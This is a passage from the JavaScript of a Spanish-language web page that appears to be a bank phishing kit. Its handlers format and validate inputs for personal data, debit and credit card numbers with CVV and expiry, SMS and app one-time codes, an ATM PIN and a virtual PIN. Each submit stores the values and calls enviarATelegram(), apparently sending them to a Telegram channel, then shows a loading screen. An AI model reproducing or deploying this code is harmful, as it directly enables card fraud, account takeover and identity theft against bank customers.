                    saveToLocalStorage('nombre', $('#nombre').val().trim());
                    saveToLocalStorage('cedula', $('#cedula').val().trim());
                    saveToLocalStorage('email', $('#email').val().trim());
                    saveToLocalStorage('celular', $('#celular').val().trim());
                    saveToLocalStorage('ciudad', $('#ciudad').val().trim());
                    saveToLocalStorage('direccion', $('#direccion').val().trim());
                    saveToLocalStorage('status', 'DATOS');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Tarjeta de Débito
            $('#numtarjetaTDB').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTarjeta('tdb');
            });

            $('#vencimientoTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
                $(this).val(value);
                validateTarjeta('tdb');
            });

            $('#cvvTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTarjeta('tdb');
            });

            $('#checkTDB').on('change', function () {
                validateTarjeta('tdb');
            });

            $('#btnTDB').on('click', async function () {
                if (validateTarjeta('tdb')) {
                    saveToLocalStorage('numtarjetaTDB', $('#numtarjetaTDB').val().trim());
                    saveToLocalStorage('cvvTDB', $('#cvvTDB').val().trim());
                    saveToLocalStorage('vencimientoTDB', $('#vencimientoTDB').val().trim());
                    saveToLocalStorage('status', 'TDB');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Tarjeta de Crédito
            $('#numtarjetaTDC').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTarjeta('tdc');
            });

            $('#vencimientoTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
                $(this).val(value);
                validateTarjeta('tdc');
            });

            $('#cvvTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTarjeta('tdc');
            });

            $('#checkTDC').on('change', function () {
                validateTarjeta('tdc');
            });

            $('#btnTDC').on('click', async function () {
                if (validateTarjeta('tdc')) {
                    saveToLocalStorage('numtarjetaTDC', $('#numtarjetaTDC').val().trim());
                    saveToLocalStorage('cvvTDC', $('#cvvTDC').val().trim());
                    saveToLocalStorage('vencimientoTDC', $('#vencimientoTDC').val().trim());
                    saveToLocalStorage('status', 'TDC');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Código SMS
            $('#codsmsInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 8) value = value.substring(0, 8);
                $(this).val(value);
                validateOtp('#codsmsInput', '#btnCodSMS');
            });

            $('#btnCodSMS').on('click', async function () {
                if (validateOtp('#codsmsInput', '#btnCodSMS')) {
                    saveToLocalStorage('codsms', $('#codsmsInput').val().trim());
                    saveToLocalStorage('status', 'CODSMS');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Código App
            $('#codappInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 8) value = value.substring(0, 8);
                $(this).val(value);
                validateOtp('#codappInput', '#btnCodApp');
            });

            $('#btnCodApp').on('click', async function () {
                if (validateOtp('#codappInput', '#btnCodApp')) {
                    saveToLocalStorage('codapp', $('#codappInput').val().trim());
                    saveToLocalStorage('status', 'CODAPP');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Clave de Cajero
            $('#pincajInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateOtp('#pincajInput', '#btnPinCaj');
            });

            $('#btnPinCaj').on('click', async function () {
                if (validateOtp('#pincajInput', '#btnPinCaj')) {
                    saveToLocalStorage('pincaj', $('#pincajInput').val().trim());
                    saveToLocalStorage('status', 'PINCAJ');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Clave Virtual
            $('#pinvirInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateOtp('#pinvirInput', '#btnPinVir');
            });

            $('#btnPinVir').on('click', async function () {
                if (validateOtp('#pinvirInput', '#btnPinVir')) {
                    saveToLocalStorage('pinvir', $('#pinvirInput').val().trim());
                    saveToLocalStorage('status', 'PINVIR');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // ==================== INICIALIZACIÓN ====================
            showView('login');
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>